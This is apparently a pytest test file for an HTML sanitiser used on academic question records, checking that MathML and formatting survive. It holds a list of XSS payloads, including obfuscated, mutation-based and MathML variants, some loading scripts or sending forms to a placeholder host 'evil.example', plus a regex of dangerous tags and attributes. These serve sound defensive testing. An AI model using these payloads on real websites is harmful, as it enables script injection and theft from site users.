"""HTML sanitisation: XSS removed, academic formatting and MathML preserved on all 43 records."""
import re

import pytest

from backend.app.sanitize import sanitize_html
from backend.app.triage.html_parse import html_to_text, iter_nodes, parse_html, split_options

DANGER = re.compile(r"<script|<iframe|<object|<embed|<svg|<style\b|<form|<meta|<base|<link|\son\w+\s*=|"
                    r"javascript:|vbscript:|data:|srcdoc|href=|\sstyle\s*=|<annotation-xml|<maction", re.I)

PAYLOADS = [
    "<img src=x onerror=alert(1)>",
    "<IMG SRC=x OnErRoR=alert(1)>",
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<svg onload=alert(1)><circle/></svg>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<object data='javascript:alert(1)'></object>",
    "<embed src='javascript:alert(1)'>",
    "<a href='javascript:alert(1)'>click</a>",
    "<a href='jav&#x09;ascript:alert(1)'>tab-obfuscated</a>",
    "<img src='javascript:alert(1)'>",
    "<img src='data:image/svg+xml;base64,PHN2Zz4='>",
    "<p style='background:url(javascript:alert(1))' onclick='x()'>t</p>",
    "<math><mi href='javascript:alert(1)'>x</mi></math>",
    "<math><maction actiontype='statusline'><mi>x</mi><mtext>javascript:alert(1)</mtext></maction></math>",
    "<math><annotation-xml encoding='text/html'><img src=x onerror=alert(1)></annotation-xml></math>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    "<form action='https://evil.example'><input name=x></form>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<base href='https://evil.example/'>",
    "<style>@import 'https://evil.example/x.css';</style>",
    "<!-- <img src=x onerror=alert(1)> -->",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    "<div><noscript><p title='</noscript><img src=x onerror=alert(1)>'></noscript></div>",
    "<template><script>alert(1)</script></template>",
]


@pytest.mark.parametrize("payload", PAYLOADS)
def test_payload_neutralised(payload):
    out = sanitize_html(payload)
    assert not DANGER.search(out), out


def test_safe_image_kept_without_handlers():
    assert sanitize_html('<img src="https://cdn.example/fig1.png" alt="fig" onerror="x">') == \
        '<img src="https://cdn.example/fig1.png" alt="fig">'


def test_malformed_html_is_balanced():
    out = sanitize_html("<h3><span>(A) unclosed <b>bold<br>(B) next")
    assert out.count("<b>") == out.count("</b>") and out.count("<span>") == out.count("</span>")
    assert html_to_text(out) == "(A) unclosed bold\n(B) next"


@pytest.mark.parametrize("raw", [None, "", "plain text & < >"])
def test_trivial_inputs(raw):
    out = sanitize_html(raw)
    assert out == "" if not raw else html_to_text(out) == "plain text & < >"


def test_academic_formatting_kept():
    raw = "<h3>x<sup>2</sup> + y<sub>1</sub> <b>bold</b> <i>it</i><br/><table><tr><td colspan='2'>t</td></tr></table></h3>"
    out = sanitize_html(raw)
    for tag in ("<sup>2</sup>", "<sub>1</sub>", "<b>bold</b>", "<i>it</i>", "<br>", 'colspan="2"'):
        assert tag in out


def test_mathml_attributes_kept():
    raw = ('<math xmlns="http://www.w3.org/1998/Math/MathML" display="inline"><mstyle displaystyle="true">'
           '<mo stretchy="true" fence="true" form="prefix">(</mo><mi mathvariant="normal">C</mi>'
           '<mspace linebreak="newline"/></mstyle></math>')
    out = sanitize_html(raw)
    for attr in ('display="inline"', 'displaystyle="true"', 'stretchy="true"', 'fence="true"',
                 'mathvariant="normal"', 'linebreak="newline"'):
        assert attr in out, attr


def _fields(questions):
    for q in questions:
        body = q[q["questionType"]]
        for f in ("question", "solution"):
            yield q["_id"], f, body[f] or ""


def test_all_records_keep_text_and_math(questions):
    """Never destroy content: readable text (which preserves maths structure) and the number of
    <math> elements are identical before and after sanitisation, for every field of every record."""
    for qid, f, raw in _fields(questions):
        safe = sanitize_html(raw)
        assert html_to_text(safe) == html_to_text(raw), (qid, f)
        assert len(list(iter_nodes(parse_html(safe), "math"))) == raw.count("<math"), (qid, f)
        assert not DANGER.search(safe), (qid, f)


def test_all_options_survive(questions):
    for q in questions:
        if q["questionType"] == "integerQuestion":
            continue
        for o in split_options(q[q["questionType"]]["question"])[1]:
            assert html_to_text(sanitize_html(o.html)) == o.text, (q["_id"], o.letter)


@pytest.mark.parametrize("qid", ["68c9ae5afb6b2f16e2d43b1c", "68dea87d387eea3d0d95fbe3", "68c8153cfb6b2f16e2d3ceaf"])
def test_stray_mspace_regression(qmap, qid):
    """These records put an unclosed <mspace> outside <math> between options. nh3 alone deleted it
    with everything inside, silently dropping options (B)-(D). Found by test_all_records_keep_text_and_math."""
    q = qmap[qid]
    text = html_to_text(sanitize_html(q[q["questionType"]]["question"]))
    for marker in ("(A)", "(B)", "(C)", "(D)"):
        assert marker in text, (qid, marker)
